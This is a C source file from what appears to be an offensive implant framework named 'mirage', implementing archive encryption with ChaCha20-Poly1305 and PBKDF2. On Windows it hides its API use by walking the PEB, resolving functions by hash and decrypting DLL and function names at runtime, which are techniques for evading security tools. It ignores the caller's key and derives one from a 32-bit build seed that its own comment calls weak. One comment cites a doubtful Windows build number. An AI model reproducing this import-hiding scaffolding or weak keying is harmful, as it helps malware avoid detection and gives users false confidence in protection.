/*
 * archive_crypt.c — ZIP archive encryption
 *
 * Wraps ChaCha20-Poly1305 with PBKDF2-SHA256 key derivation.
 * Format: [nonce (12)] [salt (16)] [ciphertext] [tag (16)]
 *
 * Uses BCrypt API on Windows, OpenSSL on Linux.
 */

#include "archive_crypt.h"
#include "chacha_poly.h"
#include "config.h"
#include "secure_zero.h"
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>

/* PEB-walk includes */
#include "bcrypt_peb.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"

/* File-local PEB-walk for SystemFunction036 (advapi32.dll) */
typedef BOOL (WINAPI *pSystemFunction036)(PVOID, ULONG);
static struct { pSystemFunction036 pRtlGenRandom; int ready; } g_advapi_rnd;
static int ensure_advapi_rnd(void) {
    if (g_advapi_rnd.ready) return 1;
    char dll[32]; enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, dll);
    void *mod = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!mod) return 0;
    char fn[32];
    enc_decrypt(enc_SystemFunction036, ENC_SYSTEMFUNCTION036_LEN, fn);
    g_advapi_rnd.pRtlGenRandom = (pSystemFunction036)mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(fn));
    if (!g_advapi_rnd.pRtlGenRandom) return 0;
    g_advapi_rnd.ready = 1;
    return 1;
}

#ifndef BCRYPT_SHA256_ALGORITHM
#define BCRYPT_SHA256_ALGORITHM L"SHA256"
#endif

#else
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#endif

/* ═══════════════════════════════════════════════════════════════
 *  Random bytes
 * ═══════════════════════════════════════════════════════════════ */

static int fill_random(unsigned char *buf, size_t len) {
#ifdef _WIN32
    if (!ensure_advapi_rnd()) return -1;
    if (!g_advapi_rnd.pRtlGenRandom(buf, (ULONG)len))
        return -1;
    return 0;
#else
    if (RAND_bytes(buf, (int)len) != 1)
        return -1;
    return 0;
#endif
}

/* ═══════════════════════════════════════════════════════════════
 *  PBKDF2-SHA256 key derivation
 * ═══════════════════════════════════════════════════════════════ */

int archive_derive_key(const unsigned char *password, size_t password_len,
                       const unsigned char *salt, size_t salt_len,
                       unsigned char out_key[32]) {
#ifdef _WIN32
    const bcrypt_api_t *bc = mirage_bcrypt_api();
    if (!bc) return -1;
    BCRYPT_ALG_HANDLE hAlgo = NULL;
    NTSTATUS status;

    /* PBKDF2 needs the HMAC PRF: without BCRYPT_ALG_HANDLE_HMAC_FLAG,
     * BCryptDeriveKeyPBKDF2 fails with STATUS_INVALID_HANDLE (0xC0000008,
     * verified on Windows 10 build 28000). */
    status = bc->pOpen(&hAlgo, BCRYPT_SHA256_ALGORITHM,
                       NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (status < 0) return -1;

    status = bc->pDerive(hAlgo,
                         (PUCHAR)password, (ULONG)password_len,
                         (PUCHAR)salt, (ULONG)salt_len,
                         210000,  /* iterations */
                         out_key, 32,
                         0);
    bc->pClose(hAlgo, 0);
    return (status >= 0) ? 0 : -1;
#else
    int rc = PKCS5_PBKDF2_HMAC((const char *)password, (int)password_len,
                                salt, (int)salt_len,
                                210000, EVP_sha256(),
                                32, out_key);
    return (rc == 1) ? 0 : -1;
#endif
}

/* ═══════════════════════════════════════════════════════════════
 *  Archive encrypt/decrypt
 * ═══════════════════════════════════════════════════════════════ */

/*
 * Derive key from the build-time seed constant + random salt.
 * seed is 4 bytes (MIRAGE_SEED from config.h), zero-extended to 8 bytes.
 * L12: 32-bit seed has low entropy — acceptable for local obfuscation, not for
 *      protecting data at rest against a targeted attacker with access to the binary.
 */
static int derive_archive_key(const unsigned char salt[ARCHIVE_SALT_LEN],
                              unsigned char out_key[32]) {
    /* Build password from seed: 4-byte seed → 8-byte LE buffer */
    unsigned char seed_buf[8];
    memset(seed_buf, 0, sizeof(seed_buf));
    seed_buf[0] = (unsigned char)(MIRAGE_SEED);
    seed_buf[1] = (unsigned char)(MIRAGE_SEED >> 8);
    seed_buf[2] = (unsigned char)(MIRAGE_SEED >> 16);
    seed_buf[3] = (unsigned char)(MIRAGE_SEED >> 24);

    return archive_derive_key(seed_buf, sizeof(seed_buf),
                              salt, ARCHIVE_SALT_LEN, out_key);
}

int archive_encrypt(const unsigned char *pt, size_t pt_len,
                    const unsigned char *key, size_t key_len,
                    unsigned char *out, size_t *out_len) {
    (void)key; (void)key_len;  /* key is unused; we derive from seed */

    unsigned char nonce[CHACHA_POLY_NONCE_LEN];
    unsigned char salt[ARCHIVE_SALT_LEN];

    if (fill_random(nonce, sizeof(nonce)) < 0)
        return -1;
    if (fill_random(salt, sizeof(salt)) < 0)
        return -1;

    /* Derive actual key from seed + salt */
    unsigned char derived_key[32];
    if (derive_archive_key(salt, derived_key) < 0)
        return -1;

    size_t header_len = ARCHIVE_HEADER_LEN;
    size_t ct_and_tag = pt_len + CHACHA_POLY_TAG_LEN;
    size_t total = header_len + ct_and_tag;

    /* Check output buffer size */
    if (*out_len < total)
        return -1;

    /* Write header: nonce || salt */
    memcpy(out, nonce, CHACHA_POLY_NONCE_LEN);
    memcpy(out + CHACHA_POLY_NONCE_LEN, salt, ARCHIVE_SALT_LEN);

    /* Encrypt */
    size_t enc_len = 0;
    if (chacha_poly_encrypt(pt, pt_len, derived_key, nonce,
                            NULL, 0,
                            out + header_len, &enc_len) < 0)
        return -1;

    *out_len = header_len + enc_len;
    mirage_secure_zero(derived_key, 32);
    return 0;
}

int archive_decrypt(const unsigned char *ct, size_t ct_len,
                    const unsigned char *key, size_t key_len,
                    unsigned char *out, size_t *out_len) {
    (void)key; (void)key_len;

    if (ct_len < ARCHIVE_HEADER_LEN + CHACHA_POLY_TAG_LEN)
        return -1;

    /* Parse header */
    unsigned char nonce[CHACHA_POLY_NONCE_LEN];
    unsigned char salt[ARCHIVE_SALT_LEN];
    memcpy(nonce, ct, CHACHA_POLY_NONCE_LEN);
    memcpy(salt, ct + CHACHA_POLY_NONCE_LEN, ARCHIVE_SALT_LEN);

    /* Derive key */
    unsigned char derived_key[32];
    if (derive_archive_key(salt, derived_key) < 0)
        return -1;

    /* Decrypt */
    const unsigned char *ciphertext = ct + ARCHIVE_HEADER_LEN;
    size_t ciphertext_len = ct_len - ARCHIVE_HEADER_LEN;

    int rc = chacha_poly_decrypt(ciphertext, ciphertext_len,
                               derived_key, nonce,
                               NULL, 0,
                               out, out_len);
    mirage_secure_zero(derived_key, 32);
    return rc;
}
